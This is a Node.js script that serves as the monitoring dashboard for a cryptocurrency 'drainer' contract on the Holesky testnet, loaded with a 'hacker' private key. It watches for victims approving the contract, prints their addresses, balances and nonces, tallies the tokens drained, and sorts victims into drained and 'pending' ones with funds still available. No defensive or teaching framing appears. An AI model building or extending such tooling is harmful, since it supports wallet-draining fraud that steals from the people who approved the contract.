require('dotenv').config();
const { ethers } = require("ethers");

const rpcUrl = process.env.ETHEREUM_HOLESKY_ENDPOINT;
const contractAddress = process.env.THKXDrainer;
const privateKey = process.env.HACKER_PRIVATE_KEY;

const provider = new ethers.JsonRpcProvider(rpcUrl);
const wallet = new ethers.Wallet(privateKey, provider);

const abi = [
    "function victimCount() view returns (uint256)",
    "function getVictims() view returns (address[])",
    "function getTotalDrained() view returns (uint256)",
    "function isPaused() view returns (bool)",
    "function isDestroyed() view returns (bool)",
    "function drainedAmount(address) view returns (uint256)",
    "event VictimApproved(address indexed victim)"
];

const contract = new ethers.Contract(contractAddress, abi, wallet);

let lastBlockChecked = 0;
let startTime = Date.now();

function formatDuration(ms) {
    const seconds = Math.floor(ms / 1000);
    const minutes = Math.floor(seconds / 60);
    const hours = Math.floor(minutes / 60);
    return `${hours}h ${minutes % 60}m ${seconds % 60}s`;
}

async function getVictimDetails(victim) {
    try {
        const balance = await provider.getBalance(victim);
        const code = await provider.getCode(victim);
        const nonce = await provider.getTransactionCount(victim);
        
        return {
            balance: ethers.formatEther(balance),
            isContract: code !== '0x',
            nonce: nonce
        };
    } catch (err) {
        console.error(`⚠️ Error getting victim details: ${err.message}`);
        return null;
    }
}


function clearConsole() {
    process.stdout.write('\x1Bc');
}

async function initMonitoring() {
    try {
        lastBlockChecked = await provider.getBlockNumber();
        clearConsole();
        console.log('\n🔥 THKX Drainer Monitoring System 🔥');
        console.log('=================================================================');
        console.log(`🌐 Network: ${(await provider.getNetwork()).name}`);
        console.log(`📍 Contract: ${contractAddress}`);
        console.log(`🏁 Starting Block: ${lastBlockChecked}`);
        console.log('=================================================================\n');

        setInterval(async () => {
            try {
                const currentBlock = await provider.getBlockNumber();

                if (currentBlock <= lastBlockChecked) {
                    return;
                }

                const safeFrom = lastBlockChecked + 1;
                const safeTo = currentBlock;
                const maxRange = 500;

                const fromBlock = safeFrom;
                const toBlock = safeTo - safeFrom > maxRange ? safeFrom + maxRange : safeTo;

                const events = await contract.queryFilter("VictimApproved", fromBlock, toBlock);

                if (events.length > 0) {
                    clearConsole(); 
                    for (const event of events) {
                        const victim = event.args.victim;
                        const victimDetails = await getVictimDetails(victim);
                        
                        console.log('\n🎯 NEW VICTIM DETECTED 🎯');
                        console.log('---------------------------------------------------');
                        console.log(`📍 Address: ${victim}`);
                        console.log(`💰 Balance: ${victimDetails?.balance || 'Unknown'} ETH`);
                        console.log(`🔢 Nonce: ${victimDetails?.nonce || 'Unknown'}`);
                        console.log(`🤖 Is Contract: ${victimDetails?.isContract ? 'Yes' : 'No'}`);
                        console.log(`🕒 Timestamp: ${new Date().toISOString()}`);
                        console.log(`⛓️ Block: ${event.blockNumber}`);
                        
                        const count = await contract.victimCount();
                        const drained = await contract.getTotalDrained();
                        
                        console.log('\n📊 UPDATED STATS 📊');
                        console.log('---------------------------------------------------');
                        console.log(`👥 Total Victims: ${count}`);
                        console.log(`💧 Total Drained: ${ethers.formatEther(drained)} THKX`);
                        console.log(`📈 Average per Victim: ${(Number(ethers.formatEther(drained)) / count).toFixed(4)} THKX`);
                        console.log('---------------------------------------------------\n');
                    }
                }

                lastBlockChecked = toBlock;

            } catch (err) {
                console.error("⚠️ Polling error:", err.message);
            }
        }, 10000);

        setInterval(async () => {
            try {
                clearConsole();
                const victims = await contract.getVictims();
                const drained = await contract.getTotalDrained();
                const paused = await contract.isPaused();
                const destroyed = await contract.isDestroyed();
                const uptime = formatDuration(Date.now() - startTime);

                console.log('\n📋 SYSTEM STATUS REPORT 📋');
                console.log('=================================================================');
                console.log(`⏱️ Uptime: ${uptime}`);
                console.log(`🎯 Active Victims: ${victims.length}`);
                console.log(`💰 Total Drained: ${ethers.formatEther(drained)} THKX`);
                console.log(`⚡ Current Block: ${await provider.getBlockNumber()}`);
                console.log(`⏸️ System Paused: ${paused}`);
                console.log(`💥 System Destroyed: ${destroyed}`);
                
                if (victims.length > 0) {
                    console.log('\n🎯 VICTIM LIST 🎯');
                    console.log('-------------------------------------------------------');
                    for (const victim of victims) {
                        const details = await getVictimDetails(victim);
                        console.log(`📍 ${victim}`);
                        console.log(`   💰 Balance: ${details?.balance || 'Unknown'} ETH`);
                        console.log(`   🔢 Nonce: ${details?.nonce || 'Unknown'}`);
                        console.log('-------------------------------------------------------');
                    }
                }
                
                await categorizeVictims();
                
                console.log('=================================================================\n');
            } catch (err) {
                console.error("⚠️ Status check failed:", err.message);
            }
        }, 30000);

    } catch (err) {
        console.error("⚠️ Error initializing monitoring:", err.message);
    }
}

async function categorizeVictims() {
    try {
        console.log('\n📊 VICTIM CATEGORIZATION 📊');
        console.log('=================================================================');
        
        const victims = await contract.getVictims();
        const drainedVictims = [];
        const undrainedVictims = [];
        let totalDrainedAmount = ethers.parseEther("0");

        for (const victim of victims) {
            const drainedAmount = await contract.drainedAmount(victim);
            const details = await getVictimDetails(victim);
            
            if (drainedAmount > 0) {
                drainedVictims.push({
                    address: victim,
                    drainedAmount,
                    details
                });
                totalDrainedAmount += drainedAmount;
            } else {
                undrainedVictims.push({
                    address: victim,
                    balance: details?.balance || ethers.parseEther("0"),
                    details
                });
            }
        }

        // Display drained victims
        console.log('\n🎯 DRAINED VICTIMS');
        console.log('---------------------------------------------------');
        if (drainedVictims.length > 0) {
            for (const victim of drainedVictims) {
                console.log(`📍 ${victim.address}`);
                console.log(`   💰 Drained Amount: ${ethers.formatEther(victim.drainedAmount)} THKX`);
                console.log(`   💎 Current Balance: ${victim.details?.balance || '0'} ETH`);
                console.log(`   🔢 Nonce: ${victim.details?.nonce || 'Unknown'}`);
                console.log('---------------------------------------------------');
            }
        } else {
            console.log('No drained victims found.');
        }

        // Display undrained victims
        console.log('\n⏳ PENDING VICTIMS');
        console.log('---------------------------------------------------');
        if (undrainedVictims.length > 0) {
            for (const victim of undrainedVictims) {
                console.log(`📍 ${victim.address}`);
                console.log(`   💰 Available Balance: ${ethers.formatEther(victim.balance)} ETH`);
                console.log(`   🔢 Nonce: ${victim.details?.nonce || 'Unknown'}`);
                console.log('---------------------------------------------------');
            }
        } else {
            console.log('No pending victims found.');
        }

        // Display summary
        console.log('\n📈 SUMMARY');
        console.log('---------------------------------------------------');
        console.log(`Total Victims: ${victims.length}`);
        console.log(`Drained Victims: ${drainedVictims.length}`);
        console.log(`Pending Victims: ${undrainedVictims.length}`);
        console.log(`Total Drained Amount: ${ethers.formatEther(totalDrainedAmount)} THKX`);
        console.log('=================================================================\n');

        return {
            drainedVictims,
            undrainedVictims,
            totalDrainedAmount,
            totalVictims: victims.length
        };
    } catch (err) {
        console.error(`⚠️ Error categorizing victims: ${err.message}`);
        return {
            drainedVictims: [],
            undrainedVictims: [],
            totalDrainedAmount: ethers.parseEther("0"),
            totalVictims: 0
        };
    }
}

initMonitoring();
